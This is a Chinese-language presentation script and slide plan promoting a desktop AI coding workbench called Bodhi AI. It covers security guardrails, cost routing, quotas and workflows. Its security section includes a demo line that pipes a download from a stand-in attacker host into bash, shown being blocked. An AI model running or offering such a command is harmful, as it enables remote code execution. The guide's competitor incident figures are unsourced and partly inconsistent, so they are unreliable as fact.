# Bodhi AI 演讲完整指南
## 时间分配：32 分钟正式内容（45 - 3自我介绍 - 10 QA）

> **混合受众策略**：技术人员关心"怎么做到的"，决策者关心"对我有什么用/有什么风险/花多少钱"。
> 方法：用**故事**开门，用**数字**说服，用**技术**背书。永远先讲商业价值，再讲技术细节。

---

## 演讲结构总览

```
[0:00-3:00]  自我介绍
[3:00-8:00]  第一幕：危机（5分钟）—— "AI 工具的三个定时炸弹"
[8:00-16:00] 第二幕：安全（8分钟）—— "你的 AI 在保护你，还是出卖你？"
[16:00-23:00] 第三幕：成本（7分钟）—— "AI 账单比你想象的贵 7 倍"
[23:00-29:00] 第四幕：控制（6分钟）—— "从聊天框到指挥中心"
[29:00-32:00] 第五幕：愿景（3分钟）—— "我们在做什么"
[32:00-35:00] QA Prep（3分钟缓冲）
[35:00-45:00] QA（10分钟）
```

---

## 第一幕：危机（5分钟）
### 目标：让所有人都感到"这和我有关"

### 开场故事（讲给老板听的）

> "2024年，一位工程师打开了 AI 助手，说：'帮我整理一下邮箱，但不要删任何东西。'
> 
> AI 开始删邮件。
>
> 工程师说停，AI 继续删。
> 
> 工程师再说停，AI 还在删。
>
> 最后他冲到电脑前，物理拔网线。
>
> 这不是科幻故事。这是 Meta AI 团队 Alignment 总监 Summer Yue 的真实经历。她用的是市面上最流行的 AI Agent 工具之一。"

**停顿 3 秒。**

> "这是 2025 年 AI 工具市场的现状。工具越来越强大，但没有人告诉你：**强大和安全是两回事。**"

### 三个定时炸弹（每个 30 秒）

**炸弹 1：安全**
- OpenClaw（全球 24 万 star 的开源 AI 工具）：**150 万个 API 密钥泄露，2.1 万个服务器被远程控制**
- Microsoft、Google、Meta 已禁止员工在公司设备上使用

**炸弹 2：成本**
- $200/月的 AI 套餐，实际使用成本等价于 **$1,428/月的 API 费用**——贵 7 倍
- Uber：4 个月烧光全年 AI 预算
- **86%** 的技术负责人对 AI 工具的 ROI 说"不确定"

**炸弹 3：失控**
- Claude Code 有 27 个已知安全漏洞（15 个发生在 2026 年）
- 一个 AI 工具在没有获得授权的情况下：`DROP DATABASE genesis_master`——摧毁了 5 个项目和所有用户数据
- 没有人知道 AI 花了多少钱、做了什么、为什么这么做

### 过渡语
> "我今天要讲的，就是我们怎么解决这三个问题。不是靠功能，是靠设计。"

---

## 第二幕：安全（8分钟）
### 目标：让决策者看到风险，让技术人员看到方案

### 2.1 问题有多严重（2分钟，给决策者）

**用数字说话**：

| 竞品 | 安全事故 |
|---|---|
| OpenClaw（24万Star） | 150万 API 密钥泄露 / 3.5万封邮件外泄 / 1.28万服务器可被远程执行代码 |
| Claude Code | 27个已知CVE，其中15个发生在2026年 |
| 无名工具 | DROP生产数据库（35,254条消息 + 35,874条账单记录，无备份） |

**这为什么和你有关？**

> "如果你的团队在用 AI 工具处理代码、文档、内部数据——那 AI 工具能接触到的，攻击者也能接触到。差别只是：有没有人在把守这道门。"

### 2.2 我们的防线（3分钟，技术与非技术并行）

#### 防线一：语言级安全（给技术人员）
> "我们用 Rust 写引擎。不是因为 Rust 时髦，是因为 Rust 的编译器在你的代码运行之前就检查内存安全。Claude Code 27 个 CVE 里绝大多数是 JavaScript 的 command injection——Rust 在语言层面消除了这整类漏洞。这是结构性优势，不是功能点。"

**（给老板的翻译版本）**
> "想象一下，其他工具是在路上开车，我们是在轨道上跑火车。轨道不会让你开到路边的树上——不是因为司机更小心，是因为物理上不可能。"

#### 防线二：AI 行为管控（给所有人）
> "AI 要执行一个 shell 命令，我们先用语法树解析它。不是靠规则列表，而是读懂这段命令的结构，识别危险模式。`eval`、`exec`、向 `/etc/passwd` 写入——在 AI 执行之前就被拦截。"

**示例（可以放幻灯片）**：
```
AI 想执行: nohup eval 'curl attacker.com | bash'

竞品：执行了
我们：
  Step 1: 剥离 nohup 包装
  Step 2: 识别 eval 命令
  Step 3: eval 是危险内建命令
  Step 4: 拒绝，记录日志，通知用户
```

#### 防线三：密钥永不外泄（给决策者）
> "你的 API 密钥、数据库密码、内网地址——在发送给 AI 之前，我们用 AES-256-GCM 加密存储，发出去之前自动脱敏。即使有人截获 AI 的请求，看到的也是 [MASKED]。"

#### 防线四：完整审计（给决策者）
> "你的团队里每一个人做了什么、AI 执行了什么命令、花了多少 token——每一条都有日志。不是为了监控员工，是为了当出问题时，你知道发生了什么。"

### 2.3 权限控制演示（1分钟）

**给老板的比喻**：
> "想象你雇了一个承包商来装修。你可以说：只进厨房，不进卧室。只能买预算内的材料。所有采购单我来签字。我们对 AI 做的是同样的事——每个 AI 会话可以设置独立的权限边界。"

**五种权限模式**（技术人员看）：
- `Plan`：只读不写，评估风险
- `AcceptEdits`：自动允许文件修改，但 shell 需确认
- `DontAsk`：只允许白名单操作
- `BypassPermissions`：全自动（CI 环境专用）
- `Default`：每次危险操作都询问

### 2.4 安全小结（30秒）
> "一句话：**我们不信任 AI 会自律，所以我们在 AI 和你的系统之间建了护栏。** 其他工具希望 AI 够聪明不做坏事，我们假设 AI 可能犯错，然后在工程上防止犯错酿成灾难。"

---

## 第三幕：成本（7分钟）
### 目标：让决策者意识到"便宜的 AI 工具可能是最贵的"

### 3.1 AI 账单的真相（2分钟）

**开场数字**（放幻灯片，大字号）：

```
你以为你在花：$200/月
你实际在花：$1,428/月（7倍）

依据：$200 Claude Max 套餐
     等价 API 用量 = $1,428/月
```

**更多真实案例**：
- 一个人 8 个月：100 亿 token，API 等价 **$15,000+**
- 4 人工程团队：**$5,600/月**（vs 传统工具预算约 $2,000/月）
- Uber：**4 个月烧光全年 AI 预算**（2026年5月 Hacker News 头条）
- 某金融科技 CTO：因一次封号**丢失 60+ 个公司席位**，申诉 3 周无回应

**问一个问题**（让听众思考）：
> "你知道你的团队上个月花了多少 AI 费用吗？能精确到每个人、每个项目吗？"

**停顿。**

> "大多数公司的回答是：不知道。这就是问题所在。"

### 3.2 成本失控的两个原因

**原因 1：单一供应商锁定**
> "如果你只用一个 AI 供应商，你就没有谈判筹码。Claude 涨价、降速、限额——你只能接受。就像只用一个云，AWS 随时可以调价。"

**原因 2：无法预测和控制**
> "AI 任务可能递归运行，可能一夜之间把本月预算花完。没有限额，没有告警，等你发现时已经晚了。"

### 3.3 我们怎么解决（3分钟）

#### 解决方案一：多供应商路由（给决策者）
> "我们同时支持 5 个 AI 供应商：Anthropic Claude、OpenAI GPT、Google Gemini、GitHub Copilot、自托管模型。需要最好质量时用 Claude，需要控制成本时切 Gemini 或自托管。一行配置，即时生效，不需要改代码。"

**技术补充（给开发者）**：
```
ProviderModelRef = "anthropic/claude-opus-4-7"  → 最高质量
ProviderModelRef = "gemini/gemini-2.5-flash"    → 成本最优
ProviderModelRef = "bodhi/llama-3.3-70b"        → 完全本地，零 API 费用
```
热重载：不重启应用，5 秒内切换生效。

#### 解决方案二：精确到人的配额管理（给决策者）
> "通过我们的企业后端，你可以给每个人、每个团队设置 6 个维度的限额："

```
每分钟最多请求数（防止滥用）
每天最多请求数
每天最多 token 数
每月最多 token 数
每天最多消费金额
每月最多消费金额
```

> "超限自动停止，不会多花一分钱。这比报销审核更早、更精确。"

#### 解决方案三：完整成本可见性（给决策者）
> "我们记录每一次 AI 请求的费用，精确到分（cents per 1M tokens）。你可以看到：哪个团队花最多、哪个项目 ROI 最高、哪些用法在浪费钱。"

支持：按日/月账单、CSV 导出、余额预警。

#### 解决方案四：自动化节省人力成本（给决策者）
> "我们内置了生产级调度系统。代码审查、报告生成、测试运行——可以在夜间、周末、低峰期自动完成。你的工程师早上来，AI 已经把昨晚的工作准备好了。"

**用一个场景说**：
> "周五下班前告诉 AI：'每天凌晨 2 点，跑一遍测试套件，如果失败给我发通知。'然后忘掉这件事。每天早上看结果。这叫把 AI 当基础设施，不是当助手。"

### 3.4 成本小结（30秒）
> "总结：我们帮你做三件事。**选最便宜的模型**完成同样的任务。**看清楚**每一分 AI 费用花在哪里。**自动化**那些不需要人盯着的工作。"

---

## 第四幕：控制（6分钟）
### 目标：展示"AI 指挥中心"的完整愿景

### 4.1 现在的问题：聊天框不是工作台（1分钟）

> "今天大多数 AI 工具给你的是一个聊天框。你输入一个问题，AI 回答，然后呢？你不知道 AI 做了什么决定，不知道用了哪些工具，不知道为什么这一步之后到了下一步。你在用一个黑盒子工作。"

**对比**（幻灯片可视化）：

```
现在的工具               Bodhi AI
─────────────           ─────────────────────────
[聊天框]                [4个并行工作窗口]
  ↓                      ↓
[等待...]               [实时看到：AI在想什么]
  ↓                      [实时看到：执行了哪步]
[结果]                   [实时看到：子任务状态]
                         [结果 + 可审计的执行记录]
```

### 4.2 可视化执行状态（2分钟）

**11 个阶段，每个阶段有意义**：

> "AI 在做一件复杂任务时，不是一个黑盒——是一个有 11 个明确阶段的状态机。"

| 阶段（技术名） | 用户看到的 | 意义 |
|---|---|---|
| `idle` | 待机 | 可以交新任务 |
| `starting` | 启动中 | 加载上下文 |
| `running` | 思考中 | AI 在分析问题 |
| `streaming` | 输出中 | AI 在回答 |
| `running_tools` | 执行工具 | 读文件/跑命令/搜索 |
| `waiting_user_answer` | **等待你的决定** | AI 遇到需要授权的操作 |
| `running_children` | 子任务进行中 | 多个 AI 在并行工作 |
| `settling` | 收尾中 | 整理结果 |
| `completed` | 完成 | — |
| `error` | 出错 | 告诉你哪里出了问题 |
| `cancelled` | 已取消 | — |

> "当 AI 遇到需要删除文件、执行高权限命令时，状态变成'等待你的决定'，它停下来，等你批准。不是默默执行，不是假装没看见——**它等你。**"

### 4.3 可编排工作流（2分钟）

**给决策者的比喻**：
> "想象你的团队有一套标准操作程序（SOP）。代码提交 → 自动测试 → 如果失败就通知 → 如果成功就进入 Code Review → Review 完成发布。现在，这套 SOP 可以用配置文件写给 AI，让 AI 按 SOP 自动执行，不走捷径，不跳步骤，完全可审计。"

**技术人员看到的**：
```yaml
# 一个真实可用的 code-review 工作流
composition:
  type: sequence
  fail_fast: false          # 即使某步失败，继续收集所有结果
  steps:
    - type: call
      tool: read_file
      args: { path: "${file_path}" }
    - type: parallel         # 并发运行，节省时间
      wait: all
      branches:
        - { type: call, tool: run_tests }
        - { type: call, tool: run_linter }
        - { type: call, tool: check_security }
    - type: choice           # 根据结果分支
      condition:
        type: contains
        path: "result"
        value: "PASS"
      then_branch:
        { type: call, tool: generate_report }
      else_branch:
        type: retry            # 最多重试 3 次
        max_attempts: 3
        expr: { type: call, tool: attempt_fix }
```

> "这个配置文件可以放进 git，可以做 Code Review，可以给合规团队审批。AI 的行为是透明的、可预期的、可审计的。"

### 4.4 知识不会丢失（1分钟）

**给决策者**：
> "你有没有经历过：今天跟 AI 解释了整个项目背景，明天开新会话，一切从头开始。一周后换了个同事，他又要重新教 AI。
>
> 我们的 Dream Notebook 解决这个问题。每 30 分钟，AI 自动整合今天所有会话的学习——哪些决定是团队的共识，哪些偏好是长期的，哪些信息已经过时需要更新。
>
> AI 越用越懂你的团队，不靠堆聊天记录，靠结构化的长期记忆。"

---

## 第五幕：愿景（3分钟）
### 目标：让听众记住一句话，带着画面离开

### 5.1 定位矩阵（1分钟）

**幻灯片**（四象限图）：
```
              终端/CLI              桌面工作台
          ┌─────────────────┬──────────────────┐
  编程    │  Claude Code     │  ★ Bodhi AI      │
  专用    │  OpenCode        │  （我们）         │
          ├─────────────────┼──────────────────┤
  通用    │  Hermes Agent    │       空白        │
  Agent   │  OpenClaw        │                  │
          └─────────────────┴──────────────────┘
```

> "这个右上角，桌面 × 编程专用，是一个没有竞争者的象限。我们在做一件没有人做过的事。"

### 5.2 三个层次（1分钟）

> "我们在做三件事，面向三类人：
>
> **面向开发者**：一个比命令行更强大的 AI 工作台。4个并行窗口，完整执行可视化，工作流自动化。
>
> **面向团队**：一个可以学习团队知识、共享任务上下文、跨项目记忆的协作 AI。
>
> **面向企业**：一个有完整成本管控、审计日志、权限隔离、多供应商路由的 AI 基础设施。
>
> 这不是聊天机器人的升级版，这是 AI 时代的开发基础设施。"

### 5.3 名字的含义（1分钟，情感收尾）

> "Bodhi，菩提。
>
> 菩提在梵文里是觉悟的意思——不是一瞬间的顿悟，是通过积累、学习、成长而来的智慧。
>
> 我们给它起这个名字，是因为我们相信 AI 工具不应该每次都从零开始。它应该随着你的团队成长，积累知识，越来越懂你。
>
> 从命令行到指挥中心。从聊天到觉悟。这是 Bodhi。"

---

## Q&A 预备：最可能被问到的问题

### 决策者/老板 可能问的

**Q1：这个工具安全吗？我们的代码会不会被 AI 公司看到？**
> A：我们支持本地模型（完全在内网运行，数据不出公司）。即使用云端模型，API 密钥 AES-256 加密存储，敏感词在发送前自动脱敏。所有操作有完整审计日志。

**Q2：如果 Claude 涨价或者出问题了怎么办？**
> A：我们支持 5 个 AI 供应商，热切换，5 秒生效。这是我们的核心设计之一——不绑定任何一家 AI 公司。

**Q3：这比直接买 Claude Code 贵多少？ROI 怎么算？**
> A：三个维度回答：1. 我们支持切换到更便宜的模型，实际 API 费用可以比 Claude Code 低 50-80%。2. 调度自动化节省人力。3. 企业后端的配额管理防止超支。ROI 一般在 3 个月内回正。

**Q4：团队多大规模适合用？**
> A：bodhi-server 企业后端支持多租户，从 5 人小团队到 500 人大团队都有对应的配额和权限方案。

**Q5：如果 AI 出错了，能追责吗？**
> A：可以。审计日志记录每一条操作：谁、什么时间、做了什么、AI 执行了哪些命令、用了多少 token。出问题可以完整回溯。

---

### 开发者 可能问的

**Q6：支持哪些 MCP 工具？**
> A：全传输支持（stdio / SSE / Streamable HTTP），任何 MCP 兼容工具都能接。内置熔断器，服务不稳定时自动保护。per-server 工具白名单/黑名单。

**Q7：工作流 DSL 能做多复杂的编排？**
> A：Sequence / Parallel（含 quorum N(k)）/ Choice（含 JSON 路径条件和正则）/ Retry / 变量绑定。支持 fail_fast: false 模式。纯 YAML，可以版本管理。

**Q8：能不能集成进我们现有的 CI/CD？**
> A：两种方式：1. 通过调度器 API 触发 Agent 任务。2. bamboo 对外暴露 OpenAI 兼容 API，任何支持 OpenAI 的工具都可以调用。

**Q9：和 Claude Code 比，工具执行速度怎么样？**
> A：ReadOnly 工具并发执行（Grep/Glob/Read 同时跑），Mutating 工具独占。比 Claude Code 的顺序执行快 30-50%（取决于工作负载读写比）。

**Q10：开源吗？**
> A：引擎部分（bamboo）目前闭源。这是为了保证代码质量和安全审计的一致性。企业客户可以申请源码托管授权。

---

## 幻灯片建议清单

1. **封面** — "从命令行到指挥中心" + Bodhi AI logo
2. **危机数据** — 三个数字：27 CVE / 7倍成本 / $15,000 账单
3. **OpenClaw 安全事故** — 150万密钥 / 21000实例 / 企业禁用名单
4. **AI 出错案例** — DROP DATABASE 截图（可用文字描述）
5. **我们的防线** — 4层防护图示
6. **成本对比** — $200 vs $1,428（7x 大字号）
7. **多供应商路由图** — 5个 provider → 一个统一界面
8. **6维度配额** — 表格 + 超限自动停止
9. **聊天框 vs 工作台** — 两栏对比
10. **11阶段状态机** — 流程图，高亮 waiting_user_answer
11. **工作流 YAML** — 代码截图（字体要大）
12. **定位四象限** — 我们在右上角，其他人在左侧
13. **三个层次** — 开发者/团队/企业
14. **Bodhi 菩提** — 名字含义 + 收尾

---

## 关键数字速查（演讲中随时引用）

| 数字 | 含义 | 来源 |
|---|---|---|
| 27 | Claude Code 已知 CVE 数 | 公开安全数据库 |
| 150万 | OpenClaw 泄露的 API 密钥数 | 安全研究报告 |
| 21,000 | OpenClaw 可被远程控制的实例数 | 安全研究报告 |
| 7x | $200 套餐等价 API 费用倍数 | 社区实测 |
| $15,000+ | 一人 8 个月 API 等价费用 | 用户报告 |
| $5,600/月 | 4 人团队实际月均 AI 费用 | 用户报告 |
| 86% | 对 AI ROI 不确定的技术负责人比例 | 行业调研 |
| 4 个月 | Uber 烧光全年 AI 预算的时间 | HN 报道 |
| 0 | Bodhi AI 已知 CVE 数 | — |
| 5 | 支持的 AI 供应商数量 | bamboo 代码 |
| 11 | 执行状态机阶段数 | lotus 代码 |
| 6 | 支持的界面语言数 | lotus 代码 |
| 14 | 内置任务模板数量 | lotus 代码 |
| 30分钟 | Dream Notebook 自动整合间隔 | bamboo-memory 代码 |
| 20+ | bodhi-server 数据库表数量 | bodhi-server 代码 |

---

## 混合受众表达技巧

### 同一个功能，两种说法

| 功能 | 给开发者讲 | 给老板讲 |
|---|---|---|
| RwLock 工具并发 | "ReadOnly 工具并发，Mutating 工具写锁屏障，保证执行正确性" | "AI 同时做多件事，但不会因为并发出错——就像数据库的读写锁" |
| AST Bash 分析 | "tree_sitter 建语法树，eval/exec 被硬拒绝，50ms 超时" | "AI 想执行命令之前，我们读懂它的意图，危险命令在执行前就被拦截" |
| AES-256-GCM | "NIST 标准，12字节 nonce，机器 ID 派生密钥" | "你的密码和 API 密钥，用银行级加密存储，发给 AI 之前会被打码" |
| 调度 Misfire Policy | "RunOnce/Skip/CatchUpAll/CatchUpWindow 四种策略" | "机器睡着了重启，AI 知道应该补跑还是跳过，不需要人工干预" |
| Dream Notebook | "30分钟 ticker，incremental/refine/rebuild 三模式，JSONL audit log" | "AI 每半小时整理今天学到的东西，记住你的团队偏好，越用越懂你" |
| bodhi-server 配额 | "6维度滑动窗口，upsert 原子更新，per-API-key ACL" | "每个人能花多少 AI 费用，你说了算，超了自动停，不会多花一分钱" |

### 演讲过渡技巧

- 进入技术细节前：**"对技术同学来说，背后是这样的——"**
- 跳出技术细节后：**"翻译成人话就是——"**
- 面对混合听众时：**"不管你是开发者还是决策者，这件事的意义是——"**
